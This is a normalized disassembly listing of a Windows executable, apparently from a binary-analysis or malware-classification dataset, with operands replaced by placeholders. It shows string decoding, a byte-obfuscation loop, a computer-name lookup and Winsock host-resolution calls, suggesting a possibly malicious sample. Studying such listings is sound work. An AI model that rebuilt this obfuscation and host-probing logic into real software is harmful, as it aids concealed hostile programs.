push 0xfe
call sub_4030c2
test eax eax
pop ecx
je r-xdata
call sub_402f60
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xb0 ]
[ edi ] [ esi ]
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xc4 ]
[ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x9c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x7c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x6c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x8c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ rw-data ]
push 0x13
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0xb0 ]
push eax
movsb [ edi ] [ esi ]
call sub_402f34
lea eax [ ebp - 0xc4 ]
push 0x13
push eax
call sub_402f34
push 0xe
lea eax [ ebp - 0x9c ]
push eax
call sub_402f34
lea eax [ ebp - 0x40 ]
push 0xc
push eax
call sub_402f34
lea eax [ ebp - 0x4c ]
push 0x8
push eax
call sub_402f34
lea eax [ ebp - 0x10 ]
push 0x7
push eax
call sub_402f34
lea eax [ ebp - 0x7c ]
push 0xd
push eax
call sub_402f34
lea eax [ ebp - 0x18 ]
push 0x7
push eax
call sub_402f34
add esp 0x40
lea eax [ ebp - 0x6c ]
push 0xd
push eax
call sub_402f34
lea eax [ ebp - 0x30 ]
push 0x8
push eax
call sub_402f34
lea eax [ ebp - 0x8c ]
push 0xe
push eax
call sub_402f34
lea eax [ ebp - 0x20 ]
push 0x6
push eax
call sub_402f34
lea eax [ ebp - 0x5c ]
push 0xc
push eax
call sub_402f34
push 0x3e800
call [ malloc@IAT ]
mov edi eax
add esp 0x2c
test edi edi
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0xb0 ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push edi
call sub_402f34
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
and [ eax + edi ] 0x0
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c4 ]
push eax
mov [ ebp - 0x24 ] 0x200
call [ GetComputerNameA@IAT ]
mov esi [ strstr@IAT ]
lea eax [ ebp - 0x30 ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0xc4 ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x8c ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x30 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0x9c ]
push eax
call sub_403123
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
mov ebx rw-data
je r-xdata
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x8c ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
push 0x1
pop esi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x5c ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
mov ebx rw-data
lea eax [ ebp - 0x2c4 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x2c4 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x18 ]
push eax
push edi
call esi
add esp 0x18
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x5c ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c4 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x10 ]
push eax
push edi
call esi
mov ebx eax
add esp 0x10
test ebx ebx
je r-xdata
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x6c ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x10 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
push edi
call esi
push edi
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
setne al
lea eax [ ebp - 0x2c4 ]
push 0x1
push eax
lea eax [ ebp - 0x7c ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_402ff7
add esp 0xc
test eax eax
jne r-xdata
sub_403a10
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_403bc5
cmp [ rw-data ] ebx
jne r-xdata
call sub_403bb0
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_403bc2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401041
mov eax r-xdata
retn
sub_4012a2
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_40200c
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
or dl 0xff
add eax ecx
sub dl cl
add [ eax ] dl
inc ecx
cmp ecx [ esp + 0x8 ]
jl r-xdata
sub_40209c
push [ esp + 0x4 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_402376
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_4021f2
pop ecx
pop ecx
retn
sub_4025a4
mov eax sub_4025aa
retn
sub_4025aa
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_402626
mov eax r-xdata
retn
sub_402762
mov eax sub_402768
retn
sub_402768
push 0x1
pop eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_402975
push [ rw-data ]
call sub_402e39
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_402c9e
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
memset
jmp [ memset@IAT ]
memcmp
jmp [ memcmp@IAT ]
memcpy
jmp [ memcpy@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_403bb0
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_403bc2
xor eax eax
retn
sub_403bc5
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_403be0
mov eax r--data
jmp __CxxFrameHandler
sub_403bec
mov eax r--data
jmp __CxxFrameHandler
sub_403bf8
mov eax r--data
jmp __CxxFrameHandler
sub_403c04
mov eax r--data
jmp __CxxFrameHandler
